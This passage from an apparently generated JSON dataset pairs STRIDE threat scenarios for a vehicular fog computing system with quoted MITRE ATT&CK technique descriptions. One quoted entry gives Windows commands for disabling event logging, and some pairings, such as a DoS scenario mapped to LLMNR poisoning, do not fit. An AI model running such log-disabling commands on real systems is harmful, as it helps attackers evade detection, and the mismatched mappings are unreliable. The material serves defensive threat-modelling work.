                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DoS attack on fog nodes disrupting data processing and relay to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes are not protected against high-volume traffic.",
                    "Role": "System",
                    "Condition": "Lack of DDoS protection mechanisms."
                },
                {
                    "Assumption": "The attacker can generate substantial malicious traffic.",
                    "Role": "Attacker",
                    "Condition": "Availability of resources to conduct a DDoS attack."
                }
            ],
            "Potential Impact": "Disruption in real-time processing, data relay failures, potential traffic management collapse.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Fog Node",
                "Traffic",
                "DDoS"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of vulnerabilities in RSUs leading to service disruption.",
            "Assumptions": [
                {
                    "Assumption": "RSUs have unpatched vulnerabilities.",
                    "Role": "System",
                    "Condition": "Lack of regular updates and patch management."
                },
                {
                    "Assumption": "Exploits are available for known RSU vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access to appropriate exploit tools and knowledge."
                }
            ],
            "Potential Impact": "Local traffic management failures, increased accident risk.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "RSU",
                "Vulnerability",
                "Exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DoS attack on cloud services disrupting long-term data storage and analysis.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not adequately scale under load.",
                    "Role": "System",
                    "Condition": "Lack of scalable cloud infrastructure."
                },
                {
                    "Assumption": "The attacker can initiate high-volume attacks.",
                    "Role": "Attacker",
                    "Condition": "Availability of substantial attacking resources."
                }
            ],
            "Potential Impact": "Breakdown in long-term analytics and predictive services, data accessibility issues.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Cloud Service",
                "Data Storage",
                "DDoS"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to fog nodes through privilege escalation.",
            "Assumptions": [
                {
                    "Assumption": "Weakening access control mechanisms in place.",
                    "Role": "System",
                    "Condition": "Use of default or weak account credentials."
                },
                {
                    "Assumption": "Vulnerabilities exist in the fog node software.",
                    "Role": "System",
                    "Condition": "Unpatched software vulnerabilities."
                }
            ],
            "Potential Impact": "Control over local data processing, injecting malicious data, disrupting services.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Fog Node",
                "Admin Access",
                "Vulnerability"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting misconfigurations in the cloud service to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service misconfigurations exist.",
                    "Role": "System",
                    "Condition": "Improperly configured access controls and permissions."
                },
                {
                    "Assumption": "The attacker has knowledge of misconfigurations.",
                    "Role": "Attacker",
                    "Condition": "Adequate reconnaissance."
                }
            ],
            "Potential Impact": "Access to comprehensive system data, potential for data theft or tampering.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Cloud Service",
                "Misconfiguration",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromising roadside units via privilege escalation vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "RSUs have exploitable security gaps.",
                    "Role": "System",
                    "Condition": "Presence of unpatched security vulnerabilities."
                },
                {
                    "Assumption": "The attacker can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and access to exploitation tools."
                }
            ],
            "Potential Impact": "Unauthorized control over traffic management features, data injection.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "RSU",
                "Vulnerability",
                "Unauthorized Control"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate smart vehicle to gain unauthorized access to the VFC system and exploit data flows.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically or logically access the network used by the smart vehicles.",
                    "Role": "Attacker",
                    "Condition": "Attacker has physical or logical network access."
                },
                {
                    "Assumption": "There are inadequate authentication mechanisms for verifying smart vehicle identities.",
                    "Role": "System Designer",
                    "Condition": "Weak or absent authentication protocols."
                }
            ],
            "Potential Impact": "Unauthorized access to system data, leading to potential data breaches and modification of traffic data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor spoofs a fog node to intercept and manipulate data between smart vehicles and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of the fog node network protocols and addresses.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of network topology and protocols."
                },
                {
                    "Assumption": "Insufficient mutual authentication between fog nodes and smart vehicles.",
                    "Role": "System Administrator",
                    "Condition": "Lack of strong mutual authentication mechanisms."
                }
            ],
            "Potential Impact": "Interception and manipulation of data, leading to incorrect traffic management and potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "man-in-the-middle",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates cloud services to gain unauthorized access to aggregated data stored at fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can manipulate DNS or use other methods to direct fog nodes to a malicious server.",
                    "Role": "Attacker",
                    "Condition": "Ability to redirect network traffic via DNS manipulation or other methods."
                },
                {
                    "Assumption": "Fog nodes do not adequately verify the identity of cloud services.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust identity verification protocols between fog nodes and cloud services."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data stored at fog nodes, leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "impersonation",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker physically tampers with a fog node to inject malicious code and alter its behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to a fog node.",
                    "Role": "Attacker",
                    "Condition": "Proximity to fog node for physical interaction."
                },
                {
                    "Assumption": "Insufficient physical security measures to protect fog nodes.",
                    "Role": "System Administrator",
                    "Condition": "Weak or nonexistent physical security controls."
                }
            ],
            "Potential Impact": "Compromised fog node behavior, leading to corrupted data and unreliable local decision-making processes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "physical access",
                "code injection",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A cybercriminal remotely alters data sent from smart vehicles to fog nodes, compromising the integrity of traffic data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication channel between smart vehicles and fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Communication channel vulnerability to interception."
                },
                {
                    "Assumption": "Lack of end-to-end encryption for data flows between smart vehicles and fog nodes.",
                    "Role": "System Designer",
                    "Condition": "Unencrypted communication channels."
                }
            ],
            "Potential Impact": "Integrity of traffic data is compromised, leading to erroneous traffic management and potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "data integrity",
                "communication channel"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on RSUs to alter the behavior of traffic light scheduling and alert dissemination.",
            "Assumptions": [
                {
                    "Assumption": "Firmware on RSUs can be accessed and modified remotely.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability in remote access or firmware update process."
                },
                {
                    "Assumption": "Lack of secure firmware update mechanism.",
                    "Role": "System Designer",
                    "Condition": "Unsecured firmware update process."
                }
            ],
            "Potential Impact": "Malicious alteration of traffic signals, causing traffic congestion or accidents.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "remote access",
                "RSU compromise"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny sending certain data from smart vehicles to fog nodes, leading to disputes over liability in case of accidents.",
            "Assumptions": [
                {
                    "Assumption": "No logging mechanisms exist to verify data submissions from vehicles.",
                    "Role": "System Administrator",
                    "Condition": "Absence of logging and verification systems."
                },
                {
                    "Assumption": "Smart vehicles have no tamper-proof data submission logs.",
                    "Role": "Vehicle Manufacturer",
                    "Condition": "Lack of tamper-proof logging systems."
                }
            ],
            "Potential Impact": "Disputes over data integrity and liability, potentially complicating accident investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "data integrity",
                "dispute management"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A fog node denies receiving critical data from smart vehicles, affecting real-time traffic management.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are either absent or not verifying data receipt adequately.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate logging mechanisms."
                },
                {
                    "Assumption": "No acknowledgment system for data receipt from vehicles.",
                    "Role": "System Designer",
                    "Condition": "Absence of acknowledgment protocols."
                }
            ],
            "Potential Impact": "Compromise in data accountability leading to inefficiencies or failures in traffic management.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "traffic management",
                "data accountability"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via 